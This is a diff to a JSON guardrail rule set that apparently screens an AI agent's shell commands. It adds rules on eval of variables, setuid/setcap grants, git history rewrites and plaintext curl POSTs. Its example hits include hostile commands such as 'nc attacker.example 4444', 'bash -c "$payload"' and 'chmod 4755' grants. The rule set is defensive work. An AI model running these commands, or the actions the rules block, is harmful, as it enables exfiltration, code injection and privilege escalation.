@@ -115,11 +115,11 @@
     },
     {
       "id": "guardrail-integrity",
-      "version": 1,
+      "version": 2,
       "name": "Guardrail integrity",
-      "summary": "Refuse flags that bypass safety, sandboxing, or confirmation.",
-      "why": "A whole class of incidents starts with \"just add the bypass flag\". This refuses the bypass-flag family in shell commands, and warns on privilege escalation, so the agent works within its sandbox instead of disabling it.",
-      "tags": ["guardrails", "safety", "sandbox", "permissions", "bypass", "security"],
+      "summary": "Refuse flags that bypass safety, sandboxing, or confirmation; warn on shell-eval of variables.",
+      "why": "A whole class of incidents starts with \"just add the bypass flag\" or \"just eval the input\". This refuses the bypass-flag family in shell commands, warns on privilege escalation, and warns on evaluating a shell variable as a command (a classic code-injection vector when the variable comes from untrusted input).",
+      "tags": ["guardrails", "safety", "sandbox", "permissions", "bypass", "security", "eval"],
       "rules": [
         {
           "id": "bypass-flags",
@@ -166,16 +166,33 @@
           "severity": "warn",
           "reason": "Swallowing all errors hides real failures — let the command fail loudly.",
           "examples": { "hit": { "command": "migrate 2>/dev/null || true" }, "miss": { "command": "migrate || rollback" } }
+        },
+        {
+          "id": "eval-of-input",
+          "tool": "shell",
+          "pattern": "\\b(?:eval|bash\\s+-c|sh\\s+-c|zsh\\s+-c)\\s+\\S*\\$",
+          "is_regex": true,
+          "severity": "warn",
+          "reason": "Evaluating a shell variable as a command runs whatever the variable contains — if any part of it came from input you don't fully control, that's arbitrary code execution. Validate and quote the input, or avoid eval/-c altogether.",
+          "examples": {
+            "hit": { "command": "eval \"$user_input\"" },
+            "also_hits": [
+              { "command": "eval $cmd" },
+              { "command": "bash -c \"$payload\"" },
+              { "command": "sh -c $action" }
+            ],
+            "miss": { "command": "bash -c 'echo hello'" }
+          }
         }
       ]
     },
     {
       "id": "destructive-commands",
-      "version": 1,
+      "version": 2,
       "name": "Destructive & irreversible commands",
-      "summary": "Block recursive force-deletes, disk wipes, and fork bombs.",
-      "why": "Some commands have no undo. This blocks recursive force-deletes of broad roots, raw writes to block devices, filesystem formats, and fork bombs — and warns on destructive SQL — so a slip of the path does not take the machine with it.",
-      "tags": ["destructive", "rm", "disk", "safety", "shell"],
+      "summary": "Block recursive force-deletes, disk wipes, fork bombs, history rewrites, and setuid grants.",
+      "why": "Some commands have no undo. This blocks recursive force-deletes of broad roots, raw writes to block devices, filesystem formats, fork bombs, git history rewrites, and setuid/file-capability grants — and warns on destructive SQL — so a slip of the path does not take the machine with it.",
+      "tags": ["destructive", "rm", "disk", "safety", "shell", "setuid", "history"],
       "rules": [
         {
           "id": "rm-rf-broad",
@@ -221,15 +238,32 @@
           "severity": "warn",
           "reason": "Destructive SQL — confirm the target and that you have a backup.",
           "examples": { "hit": { "command": "psql -c \"DROP TABLE users\"" }, "miss": { "command": "psql -c \"SELECT count(*) FROM users\"" } }
+        },
+        {
+          "id": "setuid-setcap",
+          "tool": "shell",
+          "pattern": "\\b(?:chmod\\s+[2467]\\d{3}\\b|chmod\\s+\\S*[ug]\\+s\\b|setcap\\b)",
+          "is_regex": true,
+          "severity": "deny",
+          "reason": "Granting setuid/setgid or file capabilities lets a binary run with elevated privileges — classic privilege-escalation primitive. Do not grant unless explicitly intended.",
+          "examples": {
+            "hit": { "command": "chmod u+s /usr/bin/foo" },
+            "also_hits": [
+              { "command": "chmod 4755 /usr/bin/foo" },
+              { "command": "chmod 6755 /usr/bin/foo" },
+              { "command": "setcap cap_net_raw+ep /usr/bin/foo" }
+            ],
+            "miss": { "command": "chmod 755 /usr/bin/foo" }
+          }
         }
       ]
     },
     {
       "id": "source-control-safety",
-      "version": 1,
+      "version": 2,
       "name": "Source-control safety",
       "summary": "Keep git history and other people's work safe.",
-      "why": "Shared checkouts and rewritten history cause real damage. This refuses git stash (hides WIP), git add -A/. (sweeps up other people's changes), and non-leased force-pushes, and warns on hard resets and history rewrites.",
+      "why": "Shared checkouts and rewritten history cause real damage. This refuses git stash (hides WIP), git add -A/. (sweeps up other people's changes), non-leased force-pushes, and history rewrites (filter-branch / filter-repo / interactive rebase), and warns on hard resets.",
       "tags": ["git", "source-control", "safety", "history", "shell"],
       "rules": [
         {
@@ -271,21 +305,29 @@
         {
           "id": "warn-history-rewrite",
           "tool": "shell",
-          "pattern": "\\bgit\\s+(?:filter-branch|filter-repo)\\b",
+          "pattern": "\\bgit\\s+(?:filter-branch\\b|filter-repo\\b|rebase\\s+(?:-i\\b|--interactive\\b))",
           "is_regex": true,
-          "severity": "warn",
-          "reason": "Rewriting history affects everyone who has the repo — coordinate first.",
-          "examples": { "hit": { "command": "git filter-branch --tree-filter rm secrets" }, "miss": { "command": "git log --oneline" } }
+          "severity": "deny",
+          "reason": "History rewrites (filter-branch / filter-repo / rebase -i) discard and re-author commits — every other clone has to reset to match, and dropped commits are gone. Coordinate with the team before doing this; do not run it unattended.",
+          "examples": {
+            "hit": { "command": "git filter-branch --tree-filter rm secrets" },
+            "also_hits": [
+              { "command": "git filter-repo --path secrets --invert-paths" },
+              { "command": "git rebase -i HEAD~3" },
+              { "command": "git rebase --interactive origin/main" }
+            ],
+            "miss": { "command": "git rebase origin/main" }
+          }
         }
       ]
     },
     {
       "id": "network-exfiltration",
-      "version": 1,
+      "version": 2,
       "name": "Network & exfiltration",
-      "summary": "Block cloud-metadata SSRF and flag data-drop and internal targets.",
-      "why": "Outbound network is how data leaves and how SSRF reaches credentials. This blocks the cloud metadata endpoint (a classic credential-theft target) and flags fetches to paste/drop sites, internal addresses, and raw socket tools.",
-      "tags": ["network", "exfiltration", "ssrf", "metadata", "dlp", "web"],
+      "summary": "Block cloud-metadata SSRF and flag data-drop, internal targets, and plaintext-HTTP POSTs.",
+      "why": "Outbound network is how data leaves and how SSRF reaches credentials. This blocks the cloud metadata endpoint (a classic credential-theft target), flags fetches to paste/drop sites, internal addresses, and raw socket tools, and warns when shell-curl sends data over plaintext HTTP (intercepted on the wire).",
+      "tags": ["network", "exfiltration", "ssrf", "metadata", "dlp", "web", "http", "tls"],
       "rules": [
         {
           "id": "cloud-metadata-ssrf",
@@ -322,6 +364,22 @@
           "severity": "warn",
           "reason": "A raw network connection can move data off the machine — confirm the destination.",
           "examples": { "hit": { "command": "nc attacker.example 4444" }, "miss": { "command": "echo done" } }
+        },
+        {
+          "id": "http-data-post",
+          "tool": "shell",
+          "pattern": "\\bcurl\\b(?:\\s+\\S+)*\\s+(?:-X\\s+(?:POST|PUT|PATCH|DELETE)\\b|-d\\b|--data\\b|--data-(?:raw|binary|urlencode)\\b)(?:\\s+\\S+)*\\s+http://",
+          "is_regex": true,
+          "severity": "warn",
+          "reason": "Sending data over plaintext http:// exposes it to anyone on the network path. Switch to https:// or confirm this endpoint genuinely cannot offer TLS.",
+          "examples": {
+            "hit": { "command": "curl -X POST -d 'token=abc' http://internal.example.com/log" },
+            "also_hits": [
+              { "command": "curl --data @payload.json http://10.0.0.5/api" },
+              { "command": "curl -X PUT -d 'x' http://example.com/store" }
+            ],
+            "miss": { "command": "curl -X POST -d '{}' https://api.example.com/v1" }
+          }
         }
       ]
     },
